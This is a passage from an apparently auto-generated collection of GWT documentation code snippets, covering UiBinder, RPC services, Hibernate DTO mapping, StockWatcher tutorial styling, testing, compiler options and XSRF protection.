baseResources, Style style) {\n    this.baseResources = baseResources;\n    this.style = style;\n  }\n}\n```\n\nLANGUAGE: xml\nCODE:\n```\n<ui:with field='fancyRes' type='com.my.app.widgets.logoname.FancyResources'>\n  <ui:attributes style=\"MOBILE\" baseResources=\"{res}\"/>\n</ui:with>\n```\n\n----------------------------------------\n\nTITLE: Creating Maven GWT Project\nDESCRIPTION: Command to create a new GWT project using Maven build system with sample templates\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nwebAppCreator -out foo -templates maven,sample,readme com.example.foo.Foo\n```\n\n----------------------------------------\n\nTITLE: Applying Style to Add Stock Panel in Java\nDESCRIPTION: This Java snippet demonstrates how to apply a CSS style to the Add Stock panel in the onModuleLoad method using the addStyleName method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n// Assemble Add Stock panel.\naddPanel.add(newSymbolTextBox);\naddPanel.add(addStockButton);\naddPanel.addStyleName(\"addPanel\");\n```\n\n----------------------------------------\n\nTITLE: Creating Individual Click Handlers for GWT Buttons\nDESCRIPTION: A simple example showing the standard approach of creating individual click handlers for buttons using anonymous inner classes. While convenient, this approach can cause performance issues when used with many widgets.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nButton newButton = new Button(titleText);\n  newButton.addClickHandler(new ClickHandler() {\n    public void onClick(ClickEvent event) {\n      dialogBox.hide();\n    }\n  });\n```\n\n----------------------------------------\n\nTITLE: Maven Dependencies Configuration\nDESCRIPTION: XML configuration for GWT dependencies in Maven pom.xml file\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<dependencyManagement>\n  <dependencies>\n    <!-- ensure all GWT deps use the same version (unless overridden) -->\n    <dependency>\n      <groupId>com.google.gwt</groupId>\n      <artifactId>gwt</artifactId>\n      <version>${gwtVersion}</version>\n      <scope>import</scope>\n      <type>pom</type>\n   </dependency>\n </dependencies>\n</dependencyManagement>\n```\n\n----------------------------------------\n\nTITLE: Checking HTML5 Storage Browser Support in GWT\nDESCRIPTION: Demonstrates how to check if the browser supports HTML5 storage by attempting to get the storage object. Returns null if storage is not supported.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.storage.client.Storage;\n  private Storage stockStore = null;\n  stockStore = Storage.getLocalStorageIfSupported();\n```\n\n----------------------------------------\n\nTITLE: Interface-Based Editor Implementation in GWT\nDESCRIPTION: Demonstrates how to implement editors using interface methods instead of fields, allowing for more flexible editor definitions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\ninterface FooEditor extends Editor<Foo> {\n  // Edits the Foo.getBar() property\n  BarEditor bar();\n  // Edits the Foo.getBaz() property\n  BazEditor bazEditor();\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RPC Service Interface in Java\nDESCRIPTION: Creates the MusicStoreService interface extending RemoteService for GWT RPC, defining methods for CRUD operations on accounts and records.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n@RemoteServiceRelativePath(\"musicservice\")\npublic interface MusicStoreService extends RemoteService {\n  public List<Account> getAccounts();\n\n  public List<Record> getRecords();\n\n  public Long saveAccount(Account account);\n\n  public Long saveRecord(Record record);\n\n  public void saveRecordToAccount(Account account, Record record);\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving All Available Locales in GWT\nDESCRIPTION: Demonstrates how to get all locales for the current compilation, including runtime locales, using the localeUtils object. The returned set contains GwtLocale objects representing each supported locale.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nSet<GwtLocale> locales = localeUtils.getAllLocales();\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Remote Service with Gilead\nDESCRIPTION: Implementation of a UserRemote service that extends PersistentRemoteService with Gilead configuration. Shows setup of HibernateUtil and PersistentBeanManager.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_24\n\nLANGUAGE: java\nCODE:\n```\npublic class UserRemoteImpl extends PersistentRemoteService implements UserRemote {\n  ...\n\n      /**\n       * Constructor\n   */\n  public UserRemoteImpl() {\n    HibernateUtil hibernateUtil = new HibernateUtil();    hibernateUtil.setSessionFactory(HibernateUtil.getSessionFactory());\n\n        PersistentBeanManager persistentBeanManager = new PersistentBeanManager();    persistentBeanManager.setPersistenceUtil(hibernateUtil);    persistentBeanManager.setProxyStore(new StatelessProxyStore());\n\n        setBeanManager(persistentBeanManager);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining CSS Styles for StockWatcher Application\nDESCRIPTION: This CSS snippet defines styles for various elements in the StockWatcher application, including the body, watch list header, watch list table, numeric columns, remove column, and add panel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_3\n\nLANGUAGE: css\nCODE:\n```\n/* Formatting specific to the StockWatcher application */\nbody {\n  padding: 10px;\n}\n\n/* stock list header row */\n.watchListHeader {\n  background-color: #2062B8;\n  color: white;\n  font-style: italic;\n}\n\n/* stock list flex table */\n.watchList {\n  border: 1px solid silver;\n  padding: 2px;\n  margin-bottom:6px;\n}\n\n/* stock list Price and Change fields */\n.watchListNumericColumn {\n  text-align: right;\n  width:8em;\n}\n\n/* stock list Remove column */\n.watchListRemoveColumn {\n  text-align: center;\n}\n\n/* Add Stock panel */\n.addPanel {\n  margin: 10px 0px 15px 0px;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Stock to StockWatcher Table in Java\nDESCRIPTION: This code snippet demonstrates how to add a new stock to the StockWatcher table, including setting text and applying styles to specific cells.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\n// Add the stock to the table.\nint row = stocksFlexTable.getRowCount();\nstocks.add(symbol);\nstocksFlexTable.setText(row, 0, symbol);\nstocksFlexTable.getCellFormatter().addStyleName(row, 1, \"watchListNumericColumn\");\nstocksFlexTable.getCellFormatter().addStyleName(row, 2, \"watchListNumericColumn\");\nstocksFlexTable.getCellFormatter().addStyleName(row, 3, \"watchListRemoveColumn\");\n```\n\n----------------------------------------\n\nTITLE: XSRF-Protected Remote Service Interface\nDESCRIPTION: Modified GWT RemoteService interface with added cookie parameter for XSRF protection.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyInterface extends RemoteService {\n  public boolean doSomething(String cookieValue);\n  public void doSomethingElse(String cookieValue, String arg);\n}\n```\n\n----------------------------------------\n\nTITLE: Wrapping JSON Response in JavaScript Comments\nDESCRIPTION: This snippet demonstrates a technique for protecting JSON data from theft via <script> tags by wrapping the response in JavaScript block comments. This approach prevents direct execution of the JSON data if it's loaded via a script tag.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\n/*['foo', 'bar']*/\n```\n\n----------------------------------------\n\nTITLE: Using UiFactory Method for Widgets Requiring Constructor Arguments\nDESCRIPTION: Demonstrates how to implement a @UiFactory method in a UiBinder owner class to provide constructor arguments for widgets that require them.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\npublic class UserDashboard extends Composite {\n  interface MyUiBinder extends UiBinder<Widget, UserDashboard>;\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  private final String[] teamNames;\n\n  public UserDashboard(String... teamNames) {\n    this.teamNames = teamNames;\n    initWidget(uiBinder.createAndBindUi(this));\n  }\n\n  /** Used by MyUiBinder to instantiate CricketScores */\n  @UiFactory CricketScores makeCricketScores() { // method name is insignificant\n    return new CricketScores(teamNames);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Record DTO Class in Java\nDESCRIPTION: DTO class for Record entities containing basic record information fields and serialization support.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.musicstore.client.dto;\n\nimport java.io.Serializable;\n\npublic class RecordDTO implements Serializable {\n  private Long id;\n  private String title;\n  private int year;\n  private double price;\n\n  public RecordDTO() {\n  }\n\n  public RecordDTO(Long id) {\n  this.id = id;\n  }\n\n  public RecordDTO(Long id, String title, int year, double price) {\n    this.id = id;\n    this.title = title;\n    this.year = year;\n    this.price = price;\n  }\n\n  // Along with corresponding getters + setters.\n}\n```\n\n----------------------------------------\n\nTITLE: Changing GWT Theme in Module XML\nDESCRIPTION: This XML snippet demonstrates how to change the GWT theme from Standard to Dark by commenting out the Standard theme and uncommenting the Dark theme in the module XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Inherit the default GWT style sheet.  You can change       -->\n<!-- the theme of your GWT application by uncommenting          -->\n<!-- any one of the following lines.                            -->\n<!-- <inherits name='com.google.gwt.user.theme.standard.Standard'/> ->\n<!-- <inherits name=\"com.google.gwt.user.theme.chrome.Chrome\"/> -->\n<inherits name=\"com.google.gwt.user.theme.dark.Dark\"/>\n```\n\n----------------------------------------\n\nTITLE: Creating StockPrice Class Structure in Java\nDESCRIPTION: Initial class structure for StockPrice that will hold stock data\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\npublic class StockPrice {\n\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dozer XML Mapping with Field Exclusions for Lazy Loading\nDESCRIPTION: A more advanced Dozer mapping configuration that demonstrates how to exclude specific fields from being copied. In this example, the 'records' field is excluded to prevent lazy loading issues with Hibernate collections.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_22\n\nLANGUAGE: xml\nCODE:\n```\n<mappings>\n  <mapping>\n    <class-a>com.google.musicstore.domain.Account</class-a>\n    <class-b>com.google.musicstore.dto.AccountDTO</class-b>\n    <field-exclude>\n      <a>records</a>\n      <b>records</b>\n    </field-exclude>\n  </mapping>\n\n  <mapping>\n    <class-a>com.google.musicstore.domain.Record</class-a>\n    <class-b>com.google.musicstore.dto.RecordDTO</class-b>\n  </mapping>\n</mappings>\n\n```\n\n----------------------------------------\n\nTITLE: Browser-Specific JSNI Implementation in PopupImplIE6\nDESCRIPTION: Shows a browser-specific native JavaScript implementation using JSNI that provides special logic for Internet Explorer 6 to handle iframe shims.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDeferred.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic native void setVisible(Element popup, boolean visible) /*-{\n    if (popup.__frame) {\n      popup.__frame.style.visibility = visible ? 'visible' : 'hidden';\n    }\n  }-*/;{\n```\n\n----------------------------------------\n\nTITLE: Running GWTTestSuite from Command Line\nDESCRIPTION: Demonstrates how to run a GWTTestSuite from the command line using the Java runtime.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\njava -Xmx256M -cp \"./src:./test:./bin:./junit.jar:/gwt/gwt-user.jar:/gwt/gwt-dev.jar:/gwt/gwt-maps.jar\" junit.textui.TestRunner com.example.MapsTestSuite\n```\n\n----------------------------------------\n\nTITLE: Conditional CSS with User Agent Detection in GSS vs CSS\nDESCRIPTION: Demonstrates conditional CSS using browser detection. GSS uses the is() function to test against deferred binding properties like user.agent, with support for logical operators between conditions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_2\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@if user.agent ie8 ie9 {\n\n  .foo {...}\n\n} @else {\n\n  .bar {...}\n\n}\n\n@if locale en {\n  .baz {...}\n}\n\n/* GSS */\n@if (is(\"ie8\") || is(\"ie9\")) {\n\n  .foo {...}\n\n} @else {\n\n  .bar {...}\n\n}\n\n@if (is(\"locale\", \"en\")) {\n  .baz {...}\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Cell Padding for StockWatcher Table in Java\nDESCRIPTION: This Java snippet demonstrates how to set the cell padding for the StockWatcher table using the setCellPadding method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n  // Create table for stock data.\n  stocksFlexTable.setText(0, 0, \"Symbol\");\n  stocksFlexTable.setText(0, 1, \"Price\");\n  stocksFlexTable.setText(0, 2, \"Change\");\n  stocksFlexTable.setText(0, 3, \"Remove\");\n\n  // Add styles to elements in the stock list table.\n  stocksFlexTable.setCellPadding(6);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT Presenter\nDESCRIPTION: This snippet shows the implementation of the Presenter class in GWT. It handles the logic for updating the meeting capacity and disabling the save button when necessary.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\npublic class Presenter {\n  private Meeting meeting;\n  private MeetingView meetingView;\n  private RoomScheduler roomScheduler;\n\n  public Presenter(Meeting meeting, MeetingView meetingView, RoomScheduler roomScheduler) {\n    this.meeting = meeting;\n    this.meetingView = meetingView;\n    this.roomScheduler = roomScheduler;\n  }\n\n  /**\n   * Callback when the view's capacity text box changes\n   *\n   * @param textField the capacity TextBox widget\n   */\n  public void requiredCapacityChanged(HasText textField) {\n    meeting.setCapacity(Integer.parseInt(textField.getText()));\n    if (!roomScheduler.canAcceptCapacityFor(meeting)) {\n      meetingView.disableSaveButton();\n    }\n  }\n\n  protected Meeting getMeeting() {\n    return meeting;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Literal Function Example\nDESCRIPTION: Shows usage of literal() function for including non-standard CSS property values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_14\n\nLANGUAGE: css\nCODE:\n```\ndiv-with-literal {\n  top: literal(\"expression(document.compatMode==\\\"CSS1Compat\\\" ? documentElement.scrollTop : document.body.scrollTop \\\\ 2)\");\n}\n```\n\n----------------------------------------\n\nTITLE: Extending PersistentRemoteService for MusicStore\nDESCRIPTION: MusicStore service implementation that extends PersistentRemoteService for Gilead integration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_27\n\nLANGUAGE: java\nCODE:\n```\nimport net.sf.gilead.gwt.PersistentRemoteService;\n\npublic class MusicStoreServiceImpl extends PersistentRemoteService implements MusicStoreService {\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing NotLoggedInException\nDESCRIPTION: Implementation of a serializable exception class for handling authentication errors.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_22\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport java.io.Serializable;\n\npublic class NotLoggedInException extends Exception implements Serializable {\n\n  public NotLoggedInException() {\n    super();\n  }\n\n  public NotLoggedInException(String message) {\n    super(message);\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a GWT Label Widget as HTML\nDESCRIPTION: An example of how a GWT Label widget is rendered as HTML. The widget creates a div element with a class of gwt-Label that contains text which is not interpreted as HTML.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"gwt-Label\">Last update : Oct 1, 2008 1:31:48 PM</div>\n```\n\n----------------------------------------\n\nTITLE: Defining GWT RoomScheduler Interface\nDESCRIPTION: This snippet defines the RoomScheduler interface used in the GWT application. It declares a method to check if a meeting with a given capacity can be accepted.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\npublic interface RoomScheduler {\n  boolean canAcceptCapacityFor(Meeting meeting);\n}\n```\n\n----------------------------------------\n\nTITLE: Building and Running GWT Hibernate Application\nDESCRIPTION: Ant command to clean, build and run the GWT application with Gilead integration in hosted mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_29\n\nLANGUAGE: shell\nCODE:\n```\nant clean build hosted\n```\n\n----------------------------------------\n\nTITLE: Building GWT Application for Deployment (Shell)\nDESCRIPTION: Command to compile the StockWatcher application using Ant before deployment.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nant build\n```\n\n----------------------------------------\n\nTITLE: Using LayoutPanel without RootLayoutPanel in GWT\nDESCRIPTION: This Java code shows how to use a LayoutPanel within a normal widget like RootPanel, by explicitly setting the panel's size. This is necessary when not using RootLayoutPanel as the container.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\nLayoutPanel panel = new LayoutPanel();\nRootPanel.get(\"someId\").add(panel);\npanel.setSize(\"20em\", \"10em\");\n```\n\n----------------------------------------\n\nTITLE: Implementing XSRF Protected Service Interface Using Annotation\nDESCRIPTION: Java interface definition using @XsrfProtect annotation to enable XSRF protection\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\n\n  import com.google.gwt.user.client.rpc.RemoteService;\n  import com.google.gwt.user.server.rpc.XsrfProtect\n\n  @XsrfProtect\n  public interface MyService extends RemoteService {\n    public String myMethod(String s);\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring Dozer XML Mapping for Basic Entity Mapping\nDESCRIPTION: A simple Dozer XML mapping configuration that defines the mapping between Hibernate entity classes and their DTO equivalents. This basic mapping relies on Dozer's implicit property copying based on matching property names.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_21\n\nLANGUAGE: xml\nCODE:\n```\n<mappings>\n  <mapping>\n    <class-a>com.google.musicstore.domain.Account</class-a>\n    <class-b>com.google.musicstore.dto.AccountDTO</class-a>\n  </mapping>\n</mappings>\n\n```\n\n----------------------------------------\n\nTITLE: Implementing FakeTextContainer for GWT Testing\nDESCRIPTION: This snippet implements a FakeTextContainer class that implements the HasText interface. It's used for testing purposes to avoid instantiating real DOM elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\npublic class FakeTextContainer implements HasText {\n  private String text;\n\n  public FakeTextContainer(String text) {\n    this.text = text;\n  }\n\n  public String getText() {\n    return text;\n  }\n\n  public void setText(String text) {\n    this.text = text;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GWT Compiler Command Line Options\nDESCRIPTION: Comprehensive list of GWT compiler options including logging, optimization, source generation, and deployment configurations. Shows help text output from GWT 2.12.2 compiler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_9\n\nLANGUAGE: text\nCODE:\n```\n> java -cp gwt-dev.jar com.google.gwt.dev.Compiler\nMissing required argument 'module[s]'\nGoogle Web Toolkit 2.12.2\nCompiler [-logLevel (ERROR|WARN|INFO|TRACE|DEBUG|SPAM|ALL)] [-workDir dir] [-X[no]closureFormattedOutput] [-[no]compileReport] [-X[no]checkCasts] [-X[no]classMetadata] [-[no]draftCompile] [-[no]checkAssertions] [-XfragmentCount numFragments] [-gen dir] [-[no]generateJsInteropExports] [-includeJsInteropExports/excludeJsInteropExports regex] [-XmethodNameDisplayMode (NONE|ONLY_METHOD_NAME|ABBREVIATED|FULL)] [-Xnamespace (NONE|PACKAGE)] [-optimize level] [-[no]saveSource] [-setProperty name=value,value...] [-style (DETAILED|OBFUSCATED|PRETTY)] [-[no]failOnError] [-[no]validateOnly] [-sourceLevel [auto, 1.8, 9, 10, 11, 17]] [-localWorkers count] [-[no]incremental] [-war dir] [-deploy dir] [-extra dir] [-saveSourceOutput dir] module[s]\n\nwhere\n  -logLevel                                         The level of logging detail: ERROR, WARN, INFO, TRACE, DEBUG, SPAM or ALL (defaults to INFO)\n  -workDir                                          The compiler's working directory for internal use (must be writeable; defaults to a system temp dir)\n  -X[no]closureFormattedOutput                      EXPERIMENTAL: Enables Javascript output suitable for post-compilation by Closure Compiler (defaults to OFF)\n  -[no]compileReport                                Compile a report that tells the \"Story of Your Compile\". (defaults to OFF)\n  -X[no]checkCasts                                  EXPERIMENTAL: DEPRECATED: use jre.checks.checkLevel instead. (defaults to OFF)\n  -X[no]classMetadata                               EXPERIMENTAL: Include metadata for some java.lang.Class methods (e.g. getName()). (defaults to ON)\n  -[no]draftCompile                                 Compile quickly with minimal optimizations. (defaults to OFF)\n  -[no]checkAssertions                              Include assert statements in compiled output. (defaults to OFF)\n  -XfragmentCount                                   EXPERIMENTAL: Limits of number of fragments using a code splitter that merges split points.\n  -gen                                              Debugging: causes normally-transient generated types to be saved in the specified directory\n  -[no]generateJsInteropExports                     Generate exports for JsInterop purposes. If no -includeJsInteropExport/-excludeJsInteropExport provided, generates all exports. (defaults to OFF)\n  -includeJsInteropExports/excludeJsInteropExports  Include/exclude members and classes while generating JsInterop exports. Flag could be set multiple times to expand the pattern. (The flag has only effect if exporting is enabled via -generateJsInteropExports)\n  -XmethodNameDisplayMode                           EXPERIMENTAL: Specifies method display name mode for chrome devtools: NONE, ONLY_METHOD_NAME, ABBREVIATED or FULL (defaults to NONE)\n  -Xnamespace                                       Puts most JavaScript globals into namespaces. Default: PACKAGE for -draftCompile, otherwise NONE\n  -optimize                                         Sets the optimization level used by the compiler.  0=none 9=maximum.\n  -[no]saveSource                                   Enables saving source code needed by debuggers. Also see -debugDir. (defaults to OFF)\n  -setProperty                                      Set the values of a property in the form of propertyName=value1[,value2...].\n  -style                                           Script output style: DETAILED, OBFUSCATED or PRETTY (defaults to OBFUSCATED)\n  -[no]failOnError                                  Fail compilation if any input file contains an error. (defaults to OFF)\n  -[no]validateOnly                                 Validate all source code, but do not compile. (defaults to OFF)\n  -sourceLevel                                      Specifies Java source level (defaults to 1.8)\n  -localWorkers                                     The number of local workers to use when compiling permutations\n  -[no]incremental                                  Compiles faster by reusing data from the previous compile. (defaults to OFF)\n  -war                                              The directory into which deployable output files will be written (defaults to 'war')\n  -deploy                                           The directory into which deployable but not servable output files will be written (defaults to 'WEB-INF/deploy' under the -war directory/jar, and may be the same as the -extra directory/jar)\n  -extra                                            The directory into which extra files, not intended for deployment, will be written\n  -saveSourceOutput                                 Overrides where source files useful to debuggers will be written. Default: saved with extras.\nand\n  module[s]                                         Specifies the name(s) of the module(s) to compile\n```\n\n----------------------------------------\n\nTITLE: Adding Menu Items with Polymer Elements in GWT UiBinder\nDESCRIPTION: This updated XML template adds four menu items to the UI using Polymer paper-icon-item and iron-icon elements. Each menu item has an icon and text representing different application actions like Clear All, Clear Done, Settings, and About.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n             xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n    <g:HTMLPanel>\n        <paper-icon-item ui:field=\"menuClearAll\">\n            <iron-icon icon=\"delete\" item-icon=\"\"/>\n            <div>Clear All</div>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuClearDone\">\n            <iron-icon icon=\"clear\" item-icon=\"\"/>\n            <div>Clear Done</div>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuSettings\">\n            <iron-icon icon=\"settings\" item-icon=\"\"/>\n            <div>Settings</div>\n        </paper-icon-item>\n        <paper-icon-item ui:field=\"menuAbout\">\n            <iron-icon icon=\"help\" item-icon=\"\"/>\n            <div>About</div>\n        </paper-icon-item>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Handling Java Exceptions\nDESCRIPTION: Exception classes represent various error conditions. They can be thrown and caught to handle runtime errors.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nnew ClassCastException(String)\nnew CloneNotSupportedException()\nnew IllegalArgumentException(String, Throwable)\nnew NullPointerException()\n```\n\n----------------------------------------\n\nTITLE: CssResource Scoping Examples in Java\nDESCRIPTION: Demonstrates how scoping of obfuscated class names is defined by the return type of the CssResource accessor method. Each distinct return type provides separate collections of values for String accessors, while identical return types share values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_34\n\nLANGUAGE: java\nCODE:\n```\ninterface A extends CssResource {\n  String foo();\n}\n\ninterface B extends A {\n  String foo();\n}\n\ninterface C extends A {\n  String foo();\n}\n\ninterface D extends C {\n  // Intentionally not defining foo()\n}\n\ninterface Resources {\n  A a();\n  A a2();\n  B b();\n  C c();\n  D d();\n  D d2();\n```\n\n----------------------------------------\n\nTITLE: GWT Async Service Interface with DTO Support\nDESCRIPTION: Asynchronous service interface using DTOs for handling async operations in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_16\n\nLANGUAGE: java\nCODE:\n```\npublic interface MusicStoreServiceAsync {\n  public void getAccounts(AsyncCallback<List<AccountDTO>> callback);\n\n  public void getRecords(AsyncCallback<List<RecordDTO>> callback);\n\n  public void saveAccount(AccountDTO accountDTO, AsyncCallback<Long> callback);\n\n  public void saveRecord(RecordDTO record, AsyncCallback<Long> callback);\n\n  public void saveRecordToAccount(AccountDTO accountDTO, RecordDTO recordDTO, AsyncCallback<Void> callback);\n\n  public void getAllAccountRecords(AsyncCallback<List<AccountDTO>> callback);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a GWTTestCase for Widget Testing in Java\nDESCRIPTION: Example of a JUnit test class that extends GWTTestCase to test a custom GWT widget called UpperCasingLabel. The test verifies that the widget properly converts text to uppercase.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\nimport com.google.gwt.junit.client.GWTTestCase;\n\npublic class UpperCasingLabelTest extends GWTTestCase {\n\n  /**\n   * Specifies a module to use when running this test case. The returned\n   * module must include the source for this class.\n   * \n   * @see com.google.gwt.junit.client.GWTTestCase#getModuleName()\n   */\n  @Override\n  public String getModuleName() {\n    return \"com.example.foo.Foo\";\n  }\n \n  public void testUpperCasingLabel() {\n    UpperCasingLabel upperCasingLabel = new UpperCasingLabel();\n    \n    upperCasingLabel.setText(\"foo\");\n    assertEquals(\"FOO\", upperCasingLabel.getText());\n\n    upperCasingLabel.setText(\"BAR\");\n    assertEquals(\"BAR\", upperCasingLabel.getText());\n\n    upperCasingLabel.setText(\"BaZ\");\n    assertEquals(\"BAZ\", upperCasingLabel.getText());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Browser Emulations for HtmlUnit Testing\nDESCRIPTION: This command sets the gwt.args system property to run GWT tests in both Firefox 38 and Internet Explorer 11 emulation modes using HtmlUnit.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingHtmlUnit.md#2025-04-09_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n-runStyle 